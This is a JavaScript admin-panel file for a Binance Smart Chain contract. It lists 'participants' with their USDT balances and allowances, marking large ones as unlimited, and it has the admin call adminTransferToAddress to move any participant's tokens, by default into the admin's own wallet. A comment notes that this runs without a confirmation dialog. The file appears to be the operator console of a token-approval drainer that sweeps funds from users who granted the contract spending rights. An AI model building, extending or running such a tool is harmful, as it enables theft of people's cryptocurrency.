// Admin Panel JavaScript

let web3;
let adminAccount;
let usdtContract;
let programContract;
let participants = [];

// BSC Mainnet Configuration
const BSC_MAINNET = {
    chainId: '0x38',
    chainName: 'Binance Smart Chain',
    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    rpcUrls: ['https://bsc-dataseed1.binance.org'],
    blockExplorerUrls: ['https://bscscan.com']
};

// Contract Addresses from environment variables
const USDT_CONTRACT_ADDRESS = window.CONTRACT_ADDRESSES?.USDT_CONTRACT_ADDRESS || '0x55d398326f99059fF775485246999027B3197955';
const PROGRAM_CONTRACT_ADDRESS = window.CONTRACT_ADDRESSES?.PROGRAM_CONTRACT_ADDRESS || '0x8B9c85D168d82D6266d71b6f31bb48e3bE1caDf4';

// ABIs
const USDT_ABI = [
    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
];

const PROGRAM_ABI = [
    {"inputs":[{"name":"_from","type":"address"},{"name":"_amount","type":"uint256"}],"name":"adminTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_amount","type":"uint256"}],"name":"adminTransferToAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"user","type":"address"}],"name":"getUserAllowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"getAllParticipants","outputs":[{"name":"","type":"address[]"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"getParticipantCount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"admin","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
];

// DOM Elements
const connectAdminBtn = document.getElementById('connectAdminBtn');
const refreshDataBtn = document.getElementById('refreshDataBtn');
const loadParticipantsBtn = document.getElementById('loadParticipantsBtn');
const participantsList = document.getElementById('participantsList');
const totalParticipants = document.getElementById('totalParticipants');
const totalBalance = document.getElementById('totalBalance');
const adminWallet = document.getElementById('adminWallet');
const loadingOverlay = document.getElementById('loadingOverlay');
const loadingText = document.getElementById('loadingText');
const toast = document.getElementById('toast');
const toastMessage = document.getElementById('toastMessage');
const transferModal = document.getElementById('transferModal');
const modalFromAddress = document.getElementById('modalFromAddress');
const modalBalance = document.getElementById('modalBalance');
const modalToAddress = document.getElementById('modalToAddress');
const modalAmount = document.getElementById('modalAmount');
const confirmTransferBtn = document.getElementById('confirmTransferBtn');
const cancelTransferBtn = document.getElementById('cancelTransferBtn');
const refreshHistoryBtn = document.getElementById('refreshHistoryBtn');
const transferHistory = document.getElementById('transferHistory');

let currentTransferFrom = null;
let transferHistoryData = [];

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    setupEventListeners();
});

// Setup Event Listeners
function setupEventListeners() {
    connectAdminBtn.addEventListener('click', connectAdminWallet);
    refreshDataBtn.addEventListener('click', loadAllData);
    loadParticipantsBtn.addEventListener('click', loadParticipants);
    confirmTransferBtn.addEventListener('click', executeTransfer);
    cancelTransferBtn.addEventListener('click', closeTransferModal);
    refreshHistoryBtn.addEventListener('click', loadTransferHistory);
}

// Connect Admin Wallet
async function connectAdminWallet() {
    if (typeof window.ethereum === 'undefined') {
        showToast('❌ Please install MetaMask!', 'error');
        return;
    }

    try {
        showLoading('Connecting admin wallet...');
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        adminAccount = accounts[0];

        // Switch to BSC Mainnet
        await switchToBSCMainnet();

        // Initialize contracts
        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
        
        if (PROGRAM_CONTRACT_ADDRESS && PROGRAM_CONTRACT_ADDRESS !== 'YOUR_PROGRAM_CONTRACT_ADDRESS_HERE') {
            programContract = new web3.eth.Contract(PROGRAM_ABI, PROGRAM_CONTRACT_ADDRESS);
            
            // Verify admin
            const contractAdmin = await programContract.methods.admin().call();
            if (contractAdmin.toLowerCase() !== adminAccount.toLowerCase()) {
                hideLoading();
                showToast('⚠️ Warning: You are not the contract admin!', 'error');
                adminWallet.textContent = formatAddress(adminAccount) + ' (Not Admin)';
                adminWallet.style.color = '#EF4444';
                return;
            }
        }

        adminWallet.textContent = formatAddress(adminAccount);
        adminWallet.style.color = '#10B981';
        connectAdminBtn.textContent = 'Connected';
        connectAdminBtn.classList.add('connected');

        hideLoading();
        showToast('✅ Admin wallet connected!', 'success');

        await loadAllData();
        await loadTransferHistory();

    } catch (error) {
        hideLoading();
        console.error('Error connecting admin wallet:', error);
        showToast('❌ Connection failed: ' + error.message, 'error');
    }
}

// Switch to BSC Mainnet
async function switchToBSCMainnet() {
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_MAINNET.chainId }],
        });
    } catch (switchError) {
        if (switchError.code === 4902) {
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [BSC_MAINNET],
            });
        } else {
            throw switchError;
        }
    }
}

// Load All Data
async function loadAllData() {
    if (!programContract || !adminAccount) {
        showToast('⚠️ Please connect admin wallet first', 'error');
        return;
    }
    
    await loadParticipants();
}

// Load Participants
async function loadParticipants() {
    if (!programContract) {
        showToast('❌ Program contract not initialized', 'error');
        return;
    }

    try {
        showLoading('Loading participants...');

        const participantAddresses = await programContract.methods.getAllParticipants().call();
        participants = [];
        let totalUSDT = 0;

        // Load each participant's data
        for (let address of participantAddresses) {
            const balance = await usdtContract.methods.balanceOf(address).call();
            const allowance = await programContract.methods.getUserAllowance(address).call();
            const decimals = await usdtContract.methods.decimals().call();
            
            const balanceFormatted = balance / Math.pow(10, decimals);
            const allowanceFormatted = allowance / Math.pow(10, decimals);
            
            totalUSDT += balanceFormatted;
            
            participants.push({
                address: address,
                balance: balanceFormatted,
                allowance: allowanceFormatted,
                balanceRaw: balance,
                allowanceRaw: allowance
            });
        }

        // Update stats
        totalParticipants.textContent = participants.length;
        totalBalance.textContent = totalUSDT.toFixed(2) + ' USDT';

        // Display participants table
        displayParticipants();

        hideLoading();
        showToast('✅ Loaded ' + participants.length + ' participants', 'success');

    } catch (error) {
        hideLoading();
        console.error('Error loading participants:', error);
        showToast('❌ Failed to load participants: ' + error.message, 'error');
    }
}

// Display Participants
function displayParticipants() {
    if (participants.length === 0) {
        participantsList.innerHTML = '<p class="empty-state">No participants yet</p>';
        return;
    }

    const table = `
        <table class="user-table">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Wallet Address</th>
                    <th>USDT Balance</th>
                    <th>Allowance</th>
                    <th>Status</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                ${participants.map((p, index) => `
                    <tr>
                        <td>${index + 1}</td>
                        <td style="font-family: monospace;">${formatAddress(p.address)}</td>
                        <td style="color: #10B981; font-weight: 600;">${p.balance.toFixed(2)} USDT</td>
                        <td>${p.allowance > 1000000 ? '∞ Unlimited' : p.allowance.toFixed(2) + ' USDT'}</td>
                        <td><span class="status-badge status-active">Active</span></td>
                        <td>
                            <button class="transfer-btn" onclick="openTransferModal('${p.address}', ${p.balance})" title="Transfer USDT to any BSC wallet address">
                                💸 Transfer
                            </button>
                        </td>
                    </tr>
                `).join('')}
            </tbody>
        </table>
    `;

    participantsList.innerHTML = table;
}

// Open Transfer Modal
function openTransferModal(fromAddress, balance) {
    currentTransferFrom = fromAddress;
    modalFromAddress.value = fromAddress;
    modalBalance.value = balance.toFixed(2) + ' USDT';
    modalToAddress.value = adminAccount; // Default to admin wallet
    modalAmount.value = '';
    
    transferModal.classList.remove('hidden');
}

// Set Recipient to Admin Wallet
function setRecipientToAdmin() {
    modalToAddress.value = adminAccount;
    showToast('📌 Recipient set to admin wallet', 'success');
}

// Clear Recipient Field
function clearRecipient() {
    modalToAddress.value = '';
    showToast('🗑️ Recipient field cleared', 'info');
}

// Close Transfer Modal
function closeTransferModal() {
    transferModal.classList.add('hidden');
    currentTransferFrom = null;
}

// Execute Transfer
async function executeTransfer() {
    const toAddress = modalToAddress.value.trim() || adminAccount;
    const amount = modalAmount.value.trim();

    if (!amount || parseFloat(amount) <= 0) {
        showToast('❌ Please enter a valid amount', 'error');
        return;
    }

    if (!web3.utils.isAddress(toAddress)) {
        showToast('❌ Invalid recipient address format', 'error');
        return;
    }

    // Process transfer without confirmation dialog
    const recipientName = toAddress.toLowerCase() === adminAccount.toLowerCase() ? 'Admin Wallet' : 'Custom Wallet';
    const shortRecipient = formatAddress(toAddress);

    console.log(`🔄 Processing transfer: ${amount} USDT from ${formatAddress(currentTransferFrom)} to ${recipientName}`);

    try {
        showLoading('Processing transfer to ' + recipientName + '...');

        const decimals = await usdtContract.methods.decimals().call();
        // Convert decimal amount to wei by multiplying by 10^decimals
        const amountInWei = web3.utils.toBN(Math.floor(parseFloat(amount) * Math.pow(10, decimals))).toString();

        showToast('⏳ Please confirm the transaction in MetaMask...', 'info');

        // Call admin transfer function
        const tx = await programContract.methods.adminTransferToAddress(
            currentTransferFrom,
            toAddress,
            amountInWei.toString()
        ).send({
            from: adminAccount,
            gas: 200000
        });

        // Save transfer to history
        saveTransferToHistory({
            fromAddress: currentTransferFrom,
            toAddress: toAddress,
            amount: amount,
            tokenSymbol: 'USDT',
            tokenIcon: '💵',
            txHash: tx.transactionHash,
            status: 'success',
            gasUsed: tx.gasUsed
        });

        hideLoading();
        closeTransferModal();

        // Show detailed success message
        showToast(`✅ Transfer successful!\nSent: ${amount} USDT\nTo: ${recipientName}\nHash: ${tx.transactionHash.substring(0, 10)}...`, 'success');

        // Reload data
        await loadParticipants();

    } catch (error) {
        hideLoading();
        console.error('Error in admin transfer:', error);

        if (error.code === 4001) {
            showToast('❌ Transaction rejected by user', 'error');
        } else {
            showToast('❌ Transfer failed: ' + error.message, 'error');
        }
    }
}

// Format Address
function formatAddress(address) {
    if (!address) return '';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
}

// Show Loading
function showLoading(message = 'Processing...') {
    loadingText.textContent = message;
    loadingOverlay.classList.remove('hidden');
}

// Hide Loading
function hideLoading() {
    loadingOverlay.classList.add('hidden');
}

// Show Toast
function showToast(message, type = 'info') {
    toastMessage.textContent = message;
    toast.className = `toast ${type}`;
    toast.classList.remove('hidden');

    setTimeout(() => {
        toast.classList.add('hidden');
    }, 3000);
}

// Load Transfer History
async function loadTransferHistory() {
    if (!web3 || !adminAccount) return;

    try {
        // Load from localStorage for USDT transfer history
        const storedHistory = localStorage.getItem('usdtTransferHistory');
        if (storedHistory) {
            transferHistoryData = JSON.parse(storedHistory);
        }

        updateTransferHistoryUI();

    } catch (error) {
        console.error('Error loading transfer history:', error);
        showToast('❌ Failed to load transfer history', 'error');
    }
}

// Save Transfer to History
function saveTransferToHistory(transferData) {
    const historyEntry = {
        ...transferData,
        timestamp: new Date().toISOString(),
        id: Date.now().toString()
    };

    transferHistoryData.unshift(historyEntry); // Add to beginning

    // Keep only last 100 transfers
    if (transferHistoryData.length > 100) {
        transferHistoryData = transferHistoryData.slice(0, 100);
    }

    // Save to localStorage
    localStorage.setItem('usdtTransferHistory', JSON.stringify(transferHistoryData));

    // Update UI
    updateTransferHistoryUI();
}

// Update Transfer History UI
function updateTransferHistoryUI() {
    if (!transferHistory) return;

    if (transferHistoryData.length === 0) {
        transferHistory.innerHTML = '<p class="empty-state">No transfer history available.</p>';
        return;
    }

    const historyHTML = `
        <div style="overflow-x: auto;">
            <table style="width: 100%; border-collapse: collapse;">
                <thead>
                    <tr style="background: var(--bg-tertiary); border-bottom: 2px solid var(--border-color);">
                        <th style="padding: 12px; text-align: left; font-weight: 600; color: var(--text-primary);">Date</th>
                        <th style="padding: 12px; text-align: left; font-weight: 600; color: var(--text-primary);">From</th>
                        <th style="padding: 12px; text-align: left; font-weight: 600; color: var(--text-primary);">To</th>
                        <th style="padding: 12px; text-align: right; font-weight: 600; color: var(--text-primary);">Amount (USDT)</th>
                        <th style="padding: 12px; text-align: center; font-weight: 600; color: var(--text-primary);">Status</th>
                        <th style="padding: 12px; text-align: center; font-weight: 600; color: var(--text-primary);">Tx Hash</th>
                    </tr>
                </thead>
                <tbody>
                    ${transferHistoryData.map(transfer => {
                        const date = new Date(transfer.timestamp);
                        const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
                        const statusColor = transfer.status === 'success' ? '#10B981' :
                                         transfer.status === 'pending' ? '#F59E0B' : '#EF4444';
                        const statusText = transfer.status === 'success' ? '✅ Success' :
                                          transfer.status === 'pending' ? '⏳ Pending' : '❌ Failed';

                        return `
                            <tr style="border-bottom: 1px solid var(--border-color); hover: background: var(--bg-tertiary);">
                                <td style="padding: 12px; color: var(--text-secondary); font-size: 14px;">${formattedDate}</td>
                                <td style="padding: 12px; font-family: monospace; font-size: 12px; color: var(--text-secondary);">
                                    ${formatAddress(transfer.fromAddress)}
                                </td>
                                <td style="padding: 12px; font-family: monospace; font-size: 12px; color: var(--text-secondary);">
                                    ${transfer.toAddress.toLowerCase() === adminAccount?.toLowerCase() ? 'Admin Wallet' : formatAddress(transfer.toAddress)}
                                </td>
                                <td style="padding: 12px; text-align: right; font-weight: 600; color: var(--text-primary);">
                                    ${parseFloat(transfer.amount).toFixed(4)}
                                </td>
                                <td style="padding: 12px; text-align: center;">
                                    <span style="color: ${statusColor}; font-weight: 600;">${statusText}</span>
                                </td>
                                <td style="padding: 12px; text-align: center;">
                                    ${transfer.txHash ?
                                        `<a href="https://bscscan.com/tx/${transfer.txHash}" target="_blank"
                                           style="color: var(--primary-color); text-decoration: none; font-family: monospace; font-size: 12px;">
                                            ${transfer.txHash.substring(0, 10)}...
                                        </a>` :
                                        '<span style="color: var(--text-secondary);">-</span>'
                                    }
                                </td>
                            </tr>
                        `;
                    }).join('')}
                </tbody>
            </table>
        </div>
    `;

    transferHistory.innerHTML = historyHTML;
}

